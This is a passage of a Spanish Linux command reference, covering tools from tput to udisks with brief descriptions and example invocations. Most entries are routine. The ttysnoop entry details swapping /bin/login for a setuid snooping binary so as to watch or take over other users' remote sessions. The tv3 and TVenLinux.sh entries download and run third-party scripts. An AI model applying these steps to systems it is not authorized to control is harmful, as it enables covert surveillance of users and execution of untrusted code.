--horline                  (dibuja una linea en todo el ancho de pantalla)
--withborder               (Marca un borde en los limites de la pantalla)
--header texto             (Texto arriba del todo de la página)
--footer texto             (Texto abajo del todo de la página)
--color red 		   (Especifica un color de texto a partir de este punto)
--center Se_pondra_en_el_centro   (El texto se centrará en la página)
--right texto       (El texto se alineará a la derecha)
---         (parar la presentación hasta que se clique en la barra de espacio)
--newpage	    (nueva página. Se accede pulsando cursor abajo o espacio)
--##comentario	  	    (comentario. No aparece en la presentación)
--sleep 5           (Para la presentación 5 segundos. Por defecto son 3)
--huge Fin_de_la_presentacion 	(Figlet generará las letras del texto)
--sethugefont big   (Los tipos de letra disponibles son los de figlet: banner, big, block, bubble, digital, ivrit, leas, mini, mnemonic, script, shadow, slant, small, smscript, smshadow, smslant, standard y term)
--exec fbi -vt 01 imagen.png        (Ejecuta el comando)
--beginoutput       (crea el inicio de un marco de texto)
El_texto_que_proceda
--endoutput         (Final del marco de texto)
--beginshelloutput  (Inicio marco de texto. Con "$" saldrá letra a letra)
$ El_texto-que-proceda
--endshelloutput    (Final marco de texto)
--bZoldon            (Inicio de escritura en negrita)
El_texto_que_proceda
--boldoff	    (Final del uso de negrita)
--revon	            (Invierte los colores de letra y fondo)
El_texto_que_proceda
--revoff	    (Termina la inversión)
--ulon              (Inicio texto subrayado-??)
El_texto_que_proceda
--uloff             (Final texto subrayado)
--beginslideleft    (El texto sale de izquierda a derecha)
El_texto_que_proceda
--endslideleft      (Final de salida de izquierda a derecha)
--beginslideright   (El texto sale de derecha a izquierda)
El_texto_que_proceda
--endslideright     (Final de salida de derecha a izquierda)
--beginslidetop     (Inicio de la salida del texto de arriba)
El_texto_que_proceda
--endslidetop       (Final de salida del texto de arriba)
--beginslidebottom  (Inicio de salida del texto por abajo)
El_texto_que_proceda
--endslidebottom    (Final de salida por abajo)
Teclas para desplazarse durante la presentación
espacio (visualizar página siguiente)
b (visualizar página anterior)
q (salir de tpp)
j (saltar a la página que se indique con el teclado numérico)
s (saltar a la página de inicio)
e (ir a la última página)
c (inicio de línea de comandos)


tput
formatación de la terminal [posicionar el cursor en la pantalla, borrar datos de la pantalla, saber la cantidad de líneas y columnas de la pantalla, posicionar correctamente un campo, borrar un campo..]
$ tput cols  (Cantidad de columnas de la terminal)
$ tput lines (Cantidad de lineas)
$ tput civis (Hace invisible el cursor)
$ tput cnorm (Lo vuelve visible)
$ tput sgr0 (vuelve la terminal a los parámetros por defecto)
$ tput smcup (Borra el contenido de la terminal guardandolo)
$ tput rmcup (Restablece el contenido de la terminal borrado con el comando anterior)
$ tput colors (colores admitidos en la terminal)
$ tput bold (activar negrita)
$ tput setaf 1 (foreground rojo si la term lo soporta)
$ tput setab 4 (background azul)


tr
Cambia caracteres de un archivo
$ tr JM ?$ < archivo  (cambia las "J" y las "M" por "?" y "$" en todo el archivo)
$ cat archivo | tr ea ?% (Cambia las "e" y "a" por "?" y "%" respectivamente)
$ echo 'la pipa plena' | tr 'a-z' 'A-Z'  (De minúsculas a mayúsculas)
$ echo 'la pipa plena' | tr -d a (Borra las “a”)
$ tr -d [aeiou] archivo  (Borra las vocales de archivo)
$ echo 'la   pipa    plena' | tr -s ' ' (Borra espacios repetidos)
$ echo 'la pipa plena' | tr -c 'pln' '?' (Substituye todos los caracteres  por “?” inclusive los espacios, menos los indicados [pln])
$ ls |tr '\t' '\n' (Substituye la tabulación vertical [\t] por salto de linea [\n])
$ tr -dc A-Za-z0-9_ < /dev/urandom | head -c 8 | xargs   (contraseñas de 8 caracteres aleatorias)
$ echo "El boxeador está OK." | tr O m | tr K a | tr . l (varios tr)
$ tr " " . < archivo (substituir los espacios por puntos)
$ tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=lcase,unblock | GREP_COLOR="1;32" grep --color "[^ ]" (salvapantallas como matrix)


traceroute
Permite seguir la pista de un paquete desde un host a otro.
# traceroute www.tuxapuntes.com


tracepath
Similar a la utilidad traceroute [ver], pero también intenta descubrir la MTU de la ruta. En las redes, la unidad de transmisión máxima [MTU] es una medida que representa el tamaño máximo de paquetes de datos que un dispositivo conectado a una red aceptará. Los paquetes que exceden la MTU [1500 bytes de medida máxima] de una red no pueden atravesarla. Admite IPv4 e IPv6.
$ tracepath -p 80 localhost (del puerto 80 de localhost)
$ tracepath google.es


tracker
Sistema de indexación y búsqueda de archivos que permite gestionar y buscar metadatos de manera eficiente. Se encarga de indexar los archivos en el sistema, capturando información como nombres de archivos, tipos de archivos, contenido de documentos, etiquetas, y otros metadatos. Cuando se instala Tracker, automáticamente comienza a indexar los archivos en las ubicaciones predeterminadas como el directorio de inicio. No se necesita ejecutar un comando específico para iniciar la indexación
$ tracker3 search nombre_archivo (buscará archivos que coincidan con "nombre_archivo" en los metadatos indexados)
$ tracker3 index (mostrará información sobre los directorios indexados)
$ tracker3 info archivo (mostrará información de archivo)
$ tracker3 tag archivo (muestra la etiqueta de archivo)


trafshow
[netliag[. Es un programa interactivo que reúne el tráfico de red de todas las interfaces con capacidad de libpcap para acumularlo en la memoria caché.
# trafshow -R 1 -p (actualizar cada segundo y no poner en modo promiscuo)


tran
Herramienta que permite transliterar una palabra o una frase a otros tipos de escritura. La conversión permite comprender texto o, al menos los nombres, pero no el significado.
$ tran list (listado)
$ echo linux es genial | tran devanagari
$ echo linux es genial | tran greek
$ echo линукс эс гэнял | tran latin (salida anterior a latin)


trans
[translate-shell]. Anteriormente Google Translate CLI. Es un traductor de línea de comandos impulsado por Google Translate (predeterminado), Bing Translator, Yandex.Translate y Apertium.
$ trans -list-all (listado de todos los lenguajes soportados)
$ trans -T (ademas del listado de lenguajes soportados, su código correspondiente)
$ trans -list-all (listado de lenguajes y codigos)
$ trans -S (motores de traducción disponibles)
$ trans -i entrada.txt -o salida.txt (especificando un archivo con el texto de entrada y que muestre la traducción en salida.txt)


transmission-remote-cli
Comando para conectar con un servidor de descargas de transmission y gestionarlo.
$ transmission-remote-cli (conectar con transmission. Mira los ajustes de .config/transmission-remote-cli/settings.cfg)
$ transmission-remote-cli -f ruta/settings.cfg (especificar ruta fichero configuración)
$ transmission-remote-cli --create-config (Crea un archivo de configuración de ejemplo dentro de .config/transmission-remote-cli/settings.cfg)


trap
Captura señales del teclado. Permite ejecutar un comando especificado cuando se produce una señal con un determinado valor.
$ trap -l (Lista todos los valores)
$ trap "rm -f /tmp/$$ ; exit" 0 1 2 3 15 (ejecutará el rm si se produce una señal: 0 [Salida de la shell], 1 [SIGHUP, cuelgue], 2 [SIGINT, interrupción con ^C], 3 [SIGQUIT, quiet] o 15 [SIGTERM, terminate, señal por defecto de kill]
Ejemplo:
$ nano no_muero.sh
	#!/bin/bash
	trap "echo ' Aunque pulses Ctrl+C!'" INT
	while true
	do
	sleep 60;
	echo "No puedes matarme"
	done
El script se repetirá hasta pararlo con Ctrl+z. A continuación mirar el pid
$ jobs
$ kill -9 %pid (Para matarlo definitivamente)


trash-cli
Proporciona una utilidad de papelera en línea de comandos. Recuerda el nombre, la ruta original, la fecha de eliminación y los permisos de cada archivo eliminado. Consta de varias aplicaciones trash-empty, trash-list, trash-put, trash-restore y trash-rm.
$ trash archivo (elimina archivo)
$ trash-put archivo (lo mismo)
$ trash-list (Lista los archivos eliminados)
$ trash-restore (Pregunta el número del archivo a restaurar)
$ trash-rm *.txt (borrar todos los txt de la papelera)
$ trash-empty (Vacia la papelera)


tree
Lista archivos y directorios en forma de arbol.
$ tree -d (Sólo los directorios de la presente carpeta)
$ tree -o archivo (Enviar el resultado a un archivo)


treil
Produce una imagen de mosaicos a partir de una estructura de árbol de un directorio.
$ treil -g 800x600 -o imagen.png /usr/share (Con una geometria determinada [g], que la imagen se guarde como imagen.png [o] y el directorio del cual crear la imagen)


trickle
Limitar la velocidad de subida/bajada
Nota.- "-d" subida y "-u" bajada
$ trickle -d 50 -u 30 wget http://www.genbeta.com (limitación para un solo host)
$ trickled -d 50 -u 30 (Lanzar la limitación como demonio con lo que todas las aplicaciones que se lancen con trickle tendran la limitación especificada)
$ trickle wget http://www.genbeta.com


trimage
Herramienta para optimizar los archivos de imagen para sitios web, utilizando optipng, pngcrush, advpng y jpegoptim, dependiendo del tipo de archivo (actualmente, los archivos PNG y JPG son compatibles). Todos los archivos de imagen se comprimen sin pérdidas en los niveles de compresión más altos disponibles y EXIF y otros metadatos se eliminan.
$ trimage -f image.png (un archivo)
$ trimage -f *.png (varios)
$ trimage -d imagenes (un directorio)


tripwire
Herramienta para la detección de intrusos (IDS). Tripwire es una herramienta de comprobación de la integridad del sistema que permite detectar alteraciones en los archivos.
# tripwire --init (iniciar el servicio)
# tripwire --check (chequear el sistema)
# tripwire --check /usr (chequear un directorio especifico)
# tripwire --update (actualizar la base de datos)
# tripwire --test --email user@correo.com (realizar un test y enviarlo por correo al user)
# twprint --print-report --twrfile /var/lib/tripwire/report/Debian-20191230-190624.twr > report.txt (escribir un reporte de informe)


trocla
Generar contraseñas aleatorias y almacenarlas en varios formatos [normal, MD5, bcrypt] y poder recuperarlas.
$ trocla formats (listado de opciones)
$ trocla create usuario1 plain (creará una contraseña aleatoria y almacenará su texto sin formato en la clave usuario1. La contraseña también se mostrará en la salida)
$ trocla create usuario1 mysql (creará una contraseña aleatoria sha1 y estilo mysql se almacenará y mostrará su hash)
$ trocla create usuario2 plain 'charset: alphanumeric'
$ trocla get usuario1 plain (devuelve la contraseña almacenada para usuario1)
$ trocla delete usuario1 plain (eliminar la contraseña de usuario1 y la muestra)
$ trocla create usuario1 plain 'encode: sha512crypt'


true
No realiza absolutamente nada de los comandos que le siguen.
$ true rm * (no elimina nada)
$ true ls (no lista nada)
$ true nano /etc/fstab (no muestra el fstab)


truecrypt
Aplicación que permite cifrar sistemas de archivos enteros, generar archivos cifrados y tambien generar sistemas ocultos dentro de otros sistemas. Descarga de : http://www.truecrypt.org/downloads
Descomprimir y ejecutar:
	$ tar xf truecrypt-7.1a-linux-console-x64.tar.gz
	# ./truecrypt-7.1a-setup-console-x64
# truecrypt -t -c (por consola [t] y ejecutar por primera vez [c]. Sin el parámetro "t" abre la gui)
	Volume type:
	 1) Normal
	 2) Hidden
	Select [1]: 1
	**[Seleccionar si va a estar oculto o no: 1]**
	Enter volume path: /media/cripta
	**[Donde se montará. No tiene que existir el directorio]**
	Enter volume size (sizeK/size[M]/sizeG): 20M
	**[Tamaño del volumen: a voluntad]**
	Encryption algorithm:
	 1) AES
	 2) Serpent
	 3) Twofish
	 4) AES-Twofish
	 5) AES-Twofish-Serpent
	 6) Serpent-AES
	 7) Serpent-Twofish-AES
	 8) Twofish-Serpent
	Select [1]: 5
	**[Algoritmo de encriptación: a voluntad]**
	Hash algorithm:
	 1) RIPEMD-160
	 2) SHA-512
	 3) Whirlpool
	Select [1]: 2
	**[El hash: a voluntad]**
	Filesystem:
	 1) None
	 2) FAT
	 3) Linux Ext2
	 4) Linux Ext3
	 5) Linux Ext4
	Select [2]: 5
	**[El sistema de archivo]**
	Enter password:
	WARNING: Short passwords are easy to crack using brute force techniques!
	**[CUIDADO: Contraseñas cortas son fáciles de romper usando técnicas de fuerza bruta!]**
	We recommend choosing a password consisting of more than 20 characters. Are you sure you want to use a short password? (y=Yes/n=No) [No]: y
	**[Informa que la contraseña tiene menos de 20 caracteres pero la aceptamos de todas formas]**
	Re-enter password:
	**[La repetimos]**
	Enter keyfile path [none]:
	**[Sin archivo de claves: enter]**
	Please type at least 320 randomly chosen characters and then press Enter:
	Characters remaining: 134
	Characters remaining: 26
	**[Nos hace tipear 320 caracteres en el teclado... todavia faltan 134... todavia faltan 26...]**
	 Done: 100,000%  Speed:   22 MB/s  Left: 0 s
	**[Por fin... y toma sus notas... pasamos de ellas...]**
	The TrueCrypt volume has been successfully created.
	**[Finalmente se ha creado el volumen]**
# truecrypt -t /media/cripta (Ejecutando la aplicación. Intro a todo:)
	Enter mount directory [default]:
	Enter password for /media/cripta:
	Enter keyfile [none]:
	Protect hidden volume (if any)? (y=Yes/n=No) [No]:
# truecript -t -l (Comprobar dispositivo montado)
	1: /media/cripta /dev/mapper/truecrypt1 /media/truecrypt1
# truecrypt -d /media/cripta (Desmontar volumen)


trueprint
Se utiliza para imprimir archivos de texto con formato. Es muy útil para revisar archivos de código fuente o texto con mayor legibilidad. Pueden visualizarse con la aplicación gv
$ trueprint --K --W -n -f -F -t sh file.sh -s file.ps (Sin cabeceras [--K], ajuste de lineas inteligente [--W], sin numeración de lineas [-n], sin índice de funciones [-f], sin indice de archivo [--F], en lenguaje shell [-t sh] y redirigido a un fichero postscript [-s])
$ trueprint -H all-options (Muestra todas las opciones de ayuda)
$ trueprint -ln archivo.txt (imprimir números de linea sin recortar espacio en blanco del archivo.txt)
$ trueprint -k archivo.c (resaltar palabras clave del c´digo fuente de C)
$ trueprint -w 80 archivo.txt (para que la salida se ajuste a un ancho de 80 columnas)
$ trueprint -c archivo.py (resaltar los bloques de comentarios del archivo.py)


truncate
Reducir o extender el tamaño de un archivo al tamaño especificado. Si se reduce no se recuperan las partes reducidas.
$ truncate -s 60 archivo.txt (truncar archivo.txt a 60 bytes)
$ truncate -s -60k archivo.txt (Reducir archivo.txt a 60 k)
$ truncate -s +60k archivo.txt (Aumentar archivo.txt a 60 k)
$ truncate -s 0 archivo.txt (Borrar todo el contenido de archivo.txt)


ts
[moreutils]
Añade una marca de tiempo al principio de cada línea de entrada.
$ ts (Escribir cualquier cosa y al darle al intro mostrará la marca del tiempo y lo escrito)


tsduck
Conjunto de herramientas y plugins agrupados bajo el nombre del ejecutable principal: tsp [Transport Stream Processor]. Su filosofía es proporcionar una arquitectura modular y extensible para flujos de transporte MPEG. TSDuck se utiliza en sistemas de televisión digital para pruebas, monitorización, integración, depuración, laboratorios y demostraciones.
$ tslsdvb -v (identificar los adaptadores)
$ tsscan --verbose --delivery-system "DVB-S2" --adapter 0 --europe --nit-scan -g --lnb 950,1275,10 --save-channels ~/.tsduck.channels.xml (escanear)
$ tsp -I file mi_video.ts -P analyze (leerá mi_video.ts y el plugin analyze mostrará información como el número de paquetes, la presencia de tablas PSI/SI, los PIDs encontrados, etc)
$ tsp -I file mi_video.ts -P filter 100 -O file salida_pid_100.ts (indica que se deben pasar solo los paquetes con PID 100)
$ tsp -I dvb --adapter 0 --frontend 0 --frequency 1234 --symbol-rate 27500 -P tables --pat (especificar la tarjeta y el frontend a usar, los parámetros de la transmisión e indica que se debe mostrar la tabla PAT)
$ tsp -I udp 192.168.1.10:1234 -P bitrate (mostrará el bitrate del flujo recibido en la dirección IP y puerto especificados)
$ tsp -I file original.ts -P nullify --interval 10 -O file con_nulls.ts (inserta un Null Packet después de cada 10 paquetes originales)
$ tsp -I file servicio1.ts -I file servicio2.ts -P mux -O file multiplexado.ts (usar plugins input [para múltiples entradas] y mux para combinar varios flujos o servicios en uno solo)
$ tsp -I file video_con_subs.ts -P subtitle --dvb-teletext --output subtitulos.srt (extrae los subtítulos DVB en formato Teletext y los guarda en un fichero SRT)
$ tsp -P filter --help (mostrará todas las opciones disponibles para el plugin filter)


tset
Inicializa los valores de la terminal. Ver reset.


tshark (wireshark en modo consola)
Capturar paquetes y visualizarlos por pantalla:
# tshark -n -i eth0 -s 1515
# tshark -D (Ver las interfaces de red disponibles)
# tshark -n -i eth0 -s 1515 -w archivo (Capturar información y pasarla a un archivo)
# tshark -n -i eth0 -s 1515 -w -filesize:10000 -b 10 -w archivo (Lo mismo especificando medida máxima del archivo (-filesize:10000) y cuantidad de ficheros a crear (-b 10) en Mb
# tshark -n -i eth0 -s 1515 -a duration:3600 -w archivo (Especificando el tiempo que durará - 1 hora)
# tshark -n -t ad -r fitxer.lpc tcp (mostrar los mensajes del protocolo tcp)
# tshark -ni eth0 'tcp port tuxapuntes.com/drupal/80' -R 'http.request.method == "GET"'  (ver todas las peticiones HTTP GET)
Opciones:
-t   Para que salgan las marcas de tiempo real
-n  Inhabilita la resolución de nombres


tsort
realiza una ordenación topológica. Escribe una lista totalmente ordenada de acuerdo con el orden parcial del fichero especificado.
$ tsort archivo.txt


ttv
Webcam en consola y ascii.


tty
Muestra el número de terminal.
$ tty
1- Para entrar en las consolas virtuales, de la Crtl-Alt-F1 a la Crtl-Alt-F6, de forma automática sin tener que logearnos en cada una:
# nano /etc/systemd/system/getty.target.wants/getty\@tty1.service
        [Service]
        ExecStart=-/sbin/agetty -a USER %I $TERM
En USER poner el que corresponda, reiniciar.


tty-clock
Reloj digital por consola.
$ tty-clock -s -c -C 1 (marcando los segundos [s] en el centro de la consola [c] y en color rojo [1])
$ tty-clock -r -s -C 2 (que rebote por los lados de la terminal y de color verde)
Nota.- Otros colores: 3: amarillo, 4: azul, 5: rosa, 6:turquesa, 7: blanco


ttygif
A partir de una grabación de una sesión tty con ttyrec [ver] crea un gif.
  $ ttygif file
  Creating Animated GIF ... this can take a while
  Created: tty.gif in the current directory!


ttylog
Imprime todo lo que proviene de un dispositivo serie a la salida estándar. Se puede especificar el dispositivo y la velocidad en baudios y se puede establecer un tiempo de espera en lugar de simplemente finalizar el proceso para detenerlo.
$ ttylog -t 60 -d /dev/ttyS0 (lo que proviene del dispositivo especificado durante 60 segundos)


ttyrec
Grabación de una sesión tty.
$ ttyrec archivo  (A partir de cuando vuelva a salir el prompt se grabará todo en “archivo”. Finalizar con “killall ttyrec”)
$ ttyplay -s2 archivo (reproducir lo grabado a doble velocidad. Pulsando las telcas “-” y “+”, baja o sube la velocidad de reproducción)
$ ttyrec -a archivo  (Añadir nueva grabación a continuación de archivo. No sobreescribe archivo)
$ ttytime archivo  (Dirá los segundos que dura la grabación)
Nota.- Para compartir el archivo puede subirse a http://playterm.org/


ttysnoop
Permite monitorizar [o tomar el control] el acceso a las terminales por parte de servicios remotos [ssh, telnet...]
Habilitar la aceptación de contraseñas por parte de ssh:
# nano /etc/ssh/sshd_config
Descomentar y modificar el parámetro:
UseLogin yes
Guardar y reiniciar ssh:
# /etc/init.d/ssh restart
Reemplazar el login original por el ttysnnops.
# cd /bin/
# cp -a login lg
# cp -a /usr/sbin/ttysnoops /bin/login
Si al lanzar el último comando sale algo parecido a:
cp: no se ha podido crear el fichero ordinario «/bin/login»: Text file busy
Es que existe alguna consola tty funcionando, aunque no sea como root o root está activo en alguna pts. Matar las consolas y salir de los procesos.
Cambiar los permisos del nuevo login:
# chmod 4755 /bin/login
Editar:
# nano /etc/snooptab
Y modificar la linea:
	* socket login /bin/login
por:
	* socket login /bin/lg
Cuando por los comandos "who" o "finger" observemos que alguien se ha conectado a nuestra máquina:
# who
marquex  pts/2        2010-09-24 16:59 (tux.local)
marquex  tty7         2010-09-24 16:42 (:0)
marquex  pts/0        2010-09-24 16:50 (:0.0)
Lanzar la aplicación:
# ttysnoop 2
Connected to /dev/pts/2 snoop server...
Ctrl+'\' (ASCII 28) to suspend, Ctrl+'-' (ASCII 31) to terminate.
Snoop password:
Verified OK... Snoop started.
La contraseña a introducir tiene que ser la de root, no vale la de usuario con sudo, por tanto los ubunteros:
# passwd root


tuberias
1.-
comando1 | comando2  (el resultado de comando1 se utiliza para comando2)
$ dmesg                            (montón de datos)
$ dmesg | grep 'error'       (solo los que den "error")
2.-
comando1 & comando2 (los comando se ejecutan simultáneamente, pero  comando1 se ejecuta en segundo plano (background))
$ sudo firestarter & ifconfig
[1] 16572                   (pid de firestarter en baskground)
eth0      Link encap:Ethernet  Hwa....  (ejecución de ifconfig)
Matar el proceso de forma clásica (# kill -9 16572)
3.-
comando & exit  (Lanzado como usuario normal, ejecuta el comando o abre la aplicación y cierra la terminal [gedit & exit])
4.-
gksu comando & exit (Lo mismo pero como root [gksu synaptic & exit] Se cierra la terminal pero se abre una ventana pidiendo la contraseña)
5.-
comando1 && comando2  (si comando1 funciona  se ejecuta comando2)
Probar la diferencia con los ejemplos anterior y posterior substituyendo los caracteres.
6.-
comando1 || comando2  (comando2 se ejecuta solamente si comando1 falla)
$ sudo filestarmer || ifconfig
filestarmer: command not found    (error por tanto ...)
eth0      Link encap:Ethe ....           (... se ejecuta ifconfig)
$ ls || ifconfig                                  (solo ejecutará ls)
7.-
comando1; comando2 (comando2 se ejecuta despues de comando1)
$ ls; ifconfig; filestarmer; who
8.-
Redireccionamiento de errores:
$ cat archivo_inexistente
cat: archivo_inexistente: El fichero o el directorio no existe
El error direccionado a un archivo [error]:
$ cat archivo_inexistente 2> error
$
También pueden usarse dos signos > [2>> error] para añadir el error a continuación sin borrar el contenido del fichero “error”. Para mandar los errores al pozo sin fondo:
$ cat archivo_inexistente 2>/dev/null
O varios direccionamientos:
$ find / -name archivo > encontrado 2> errores &
$ find / -name archivo >& encontrado-errores.txt (Otra forma de redirigir a dos archivos [encontrado y errores.txt])
Indicando que la salida del comando find (las rutas en donde encontró el “archivo ”) se almacene en el archivo “encontrado” y que si existe errores en la ejecución del comando (no tiene permisos para entrar a buscar en algún
directorio) el error se almacene en el archivo “errores”. Adicionalmente enviamos el comando a background para poder hacer uso de la terminal mientras se realiza el proceso.


tune2fs
[tunefs]. Chequeo de la tabla de particiones
# tune2fs -c 80 /dev/sda1 (cada 80 reinicios)
# tune2fs -i 2m /dev/sda1 (cada 2 meses)
# tune2fs -i 2w /dev/hda3 (cada 2 semanas)
# tune2fs -i 2d /dev/sda1 (cada 2 dias)
# tune2fs -l /dev/sdb1 (ver registro completo de la partición)
# tune2fs -l /dev/hda3 | grep ‘Last checked’ (ver fecha del último escaneo)
# tune2fs -l /dev/hda3 | grep -i check (veces que se fuerza el chequeo)
# tune2fs -i 0 /dev/hda3 (desactivar chequeo)
# tune2fs -l /dev/hda3 | grep -i ‘mount count’ (lo mismo que el anterior)
# tune2fs -m 1 /dev/sda1 (modificar el espacio reservado para root al 1%. Por defecto es del 5%. Ver dumpe2fs)
# tune2fs -O ^has_journal /dev/sda1 (Desactivar journaling en una partición)
# tune2fs -O has_journal /dev/sda1 (Activar journaling)
1.-
Convertir sistema de archivos de ext3 a ext4. Desde un livecd o una partición no montada :
# tune2fs -O extents,uninit_bg,dir_index /dev/sdax (convertir)
# fsck -pf /dev/sdax  (Para dar consistencia al nuevo sistema)
# mount -t ext4 /dev/sdax /media/punto_de_montaje (montar la unidad)


tuned
Demonio que ajusta dinámicamente la configuración del sistema. Lo hace monitoreando periódicamente el uso de varios componentes del sistema y en base a esa información, los componentes se colocarán en modos de ahorro de energía más bajos o más altos para adaptarse a su uso.
# systemctl status tuned.service (comprobar si está activo)
# tuned (lanzarlo si no está activo)
# tuned-adm list (listado de componentes que pueden optimizarse manualmente)


tuptime
Mostrar el tiempo que esta encendido el sistema.
$ tuptime -l -e (desde que se encendió)
$ tuptime -n (muestra varios parámetros)
$ tuptime -k (tiempo de actividad del kermel)


tv3
Descarga de videos de tv3.cat.
$ wget http://www.gnulinux.cat/dev/tv3.tar.gz
$ tar -xvzf tv3.tar.gz
$ cd tv3
$ bash install
Una vez tengamos la URL del video [por ejemplo: http://www.tv3.cat/videos/4226490/Especial-diada-de-Sant-Felix-a-Vilafranca]
Arrancar la aplicación con el número que muestra:
$ tv3 4226490


TVenLinux.sh
[mplayer, zenity, rtmpdump y curl]. Script para poder ver prácticamente todos los canales de la TDT a través de Internet. Descarga: http://www.tvenlinux.com/TVenLinux.sh. Despues de otorgar permisos [chmod +x TVenLinux.sh) ejecutar con ./TVenLinux.sh.
Atajos
	q (Salir para cambiar de programa o finalizar)
	cursor izquierdo (Si el video y el audio están descompasados, podemos volver 10 segundos atrás y suele solucionar el problema)
	cursor derecho (Avanza 10 segundos)
	m (Silencia)
	p (Pausa / inicia la reproducción. En casos de desconexiones frecuentes, pausar la reproducción permite aumentar la caché)
	f (Pantalla completa)
	Mays + t (Siempre encima)


twidge
Twittear desde la linea de consola.
twidge setup (Configuración inicial)
twidge lsrecent (Leer los últimos mensajes)
twidge update "Texto" (Escribir nuevo mensaje)
twidge lsfollowers (ver listado de seguidores)
twidge following ((ver listado de los que seguimos)
twidge follow "usuario" (seguir al usuario especificado)
twidge unfollow "usuario" (Dejar de seguir a un usuario)
twidge lscommands (Listado de acciones)


twistd
Crear un servidor en el directorio especificado
$ twistd -n web --path .   (Servidor web en el actual)
$ twistd -n web --path /home/usuario/Desktop (en el escritorio)
Para acceder a él desde la red local en el navegador http://IP_local:8080
$ twistd ftp -p 2131 -r /home/usuario/Desktop --userAnonymous=juanito (crear un servidor ftp en el escritorio con el usuario juanito sin contraseña y el puerto 2131)


twitter
Red social.
Atajos de teclado:
	j y k (navegar por los tuits)
	. (desplegar nuevos tuits publicados)
	f (marcar tuit como favorito)
	t (retuitar un tuit favorito)
	r (abrir panel de respuesta a un tuit)
	m (permite escribir nuevo mensaje directo)
	gh (ir a la página principal)
	gc (ir a la página de menciones)
	gp (ir a la página de nuestro perfil)
	gf (ir a la página de tuits marcados como favorito)
	gm (ir a la página de mensajes directos)
	gl (ir a la página de listas)
	gu (buscar perfil de un usuario)


txt2html
Convertir texto a html.
$ txt2html archivo.txt --outfile archivo.html


txt2man
Convierte textos simples en páginas de manual. La sintaxis del texto debe parecerse a la salida proporcionada por el programa man. Incluye las aplicaciones bookman y src2man
$ txt2man -p texto.txt > texto.1
1.-
Ejemplo de un pdf con varias entradas man relacionadas
$ cd /usr/share/man/man1
$ bookman -p -t "Referencias gtk" gtk4* > ~/gtk.pdf


txt2tags
Convertir archivos de texto a distintos formatos.
$ txt2tags -t html fichero.txt   (convierte .txt en .html)


type
Buscar la ubicación del ejecutable e informar si el comando es un alias, un comando interno o externo.
$ type cd (informa que es interno)
$ type mplayer
$ type -a algo (Conocer todas las definiciones de “algo”, teniendo en cuenta que si “algo” es una alias, una función y un script prevalece este orden)
$ type -t cp (Conocer el tipo de un símbolo)


typeset
Define variables y les da atributos. Es necesario para operar con números y hacer cuentas con ellos. Ver "declare"
Un ejemplo de uso en un script:
	#! /bin/bash
	typeset -i suma
	suma=7+5
	echo $suma


tzdiff
Mostrar zona horaria local.
$ tzdiff -n 1 -N -H Europe/Madrid (mostrar hora local)


tzconfig
configurar nuevamente la zona horaria


tzselect
Pregunta al usuario información sobre la localización actual y muestra la descripción de la zona horaria correspondiente.
$ tzselect


tzwatch
Muestra las zonas horarias especificadas por el usuario y las guarda en el archivo ~/.tzlist.
$ tzwatch -c (Lanzar tantas veces como de zonas horarias se quiere disponer de información y seguir las instrucciones: Add Zone, Americas, 26 [Guatemala], mostrará la información y preguntará si es correcta, 1 [yes] y Done [salir])
$ tzwatch (Mostrará hora local de cada una de las zonas elegidas)
	[~]$ tzwatch
	Mon Oct  7 02:39:39 CST 2013   Australia/Adelaide
	Sun Oct  6 18:09:39 CEST 2013   Europe/Madrid
	Sun Oct  6 10:09:39 CST 2013   America/Guatemala


ubuntu-packaging-guide-html
Conjunto de artículos en español fáciles y sencillos, que ayudan a entender el empaquetado y desarrollo de Ubuntu.
$ firefox file:///usr/share/doc/ubuntu-packaging-guide-html-es/index.html


ubuntu-support-status
Muestra el estado del soporte oficial de los paquetes instalados. Útil para determinar cuando será conveniente actualizar el servidor.
$ ubuntu-support-status (Muestra un resumen del estado de los paquetes instalados)
$ ubuntu-support-status --show-unsupported (Muestra una lista detallada de los paquetes que ya no estan soportados)
$ ubuntu-support-status --show-supported (Muestra una lista detallada de los paquetes soportados así como la fecha hasta la que lo estan)
$ ubuntu-support-status --show-all (Muestra una lista detallada de todos los paquetes, tanto los soportados como los que no)


ucf
La política de Debian exige que los cambios de los usuarios en los archivos de configuración se preserven durante las actualizaciones de paquetes. La manera de lograr este comportamiento es que en este caso dpkg los maneje especialmente durante las actualizaciones, avisando al usuario según sea necesario. Contiene las aplicaciones: lcf, ucfq y ucfr
# ucf archivo_user.conf /etc/archivo.conf (gestionar el archivo de configuración en /etc/archivo.conf, preservando los cambios que el usuario ha realizado en archivo_user.conf)
# ucf --force archivo_user.conf /etc/archivo.conf (sobrescribir archivo_user.conf en /etc/archivo.conf)
# ucf --purge /etc/archivo.conf (quitar un archivo de la gestión de ucf)
# ucf --three-way archivo_user.conf /etc/archivo.conf (asegurarse de que los cambios locales se preserven)


uchardet
Detecta la codificación de un texto.
        $ uchardet texto.txt
        UTF-8


udev
Es el sistema de administración de dispositivos, que se encarga de detectar dispositivos conectados como cámaras, tarjetas de captura, memorias USB, etc. y aplicar reglas para darles nombres coherentes, cambiar permisos automáticamente o crear enlaces simbólicos [symlinks] útiles. Contiene las aplicaciones systemd-hwdb y udevadm
# systemctl status udev (comprobar si está activo)
# udevadm info --export-db | less (base de datos de dispositivos del kernel)
# udevadm monitor (monitorear eventos de dispositivos en tiempo real como conectar un USB, un disco, etc)
# udevadm control --reload-rules (si se modifica las reglas de udev [/etc/udev/rules.d/], recargar y activar los cambios)
# udevadm trigger (procesar todos los dispositivos para aplicar las nuevas reglas)
# udevadm info -a -p $(udevadm info -q path -n /dev/sda) (consultar toda la información que udev tiene sobre un dispositivo específico)
# udevadm trigger --action=change --subsystem-match=block --attr-match=dev=sda ((que udev reprocese un dispositivo después de cambiar una regla)
# udevadm control --log-priority=debug (si un dispositivo no se configura correctamente, activa el modo depuración para ver más detalles en los logs)
# systemd-hwdb -s update (devolver un valor de salida distinto de cero ante cualquier error de análisis al recargar)


udevil
Monta y desmonta dispositivos extraíbles y recursos compartidos de red sin requerir una contraseña, muestra información del dispositivo y monitorea los cambios del dispositivo. Incluye el script de montaje automático devmon.
$ udevil mount /dev/sda1
$ udevil unmount /dev/sda1
$ udevil info /dev/sda


udiskie
Herramienta  para montar automaticamente unidades en Archlinux. Debe arrancarse el servicio antes de ejecutarse el gestor de ventanas en el archivo .xinitrc. Un ejemplo:
# nano .xinitrc
udiskie & exec openbox-session


udisks
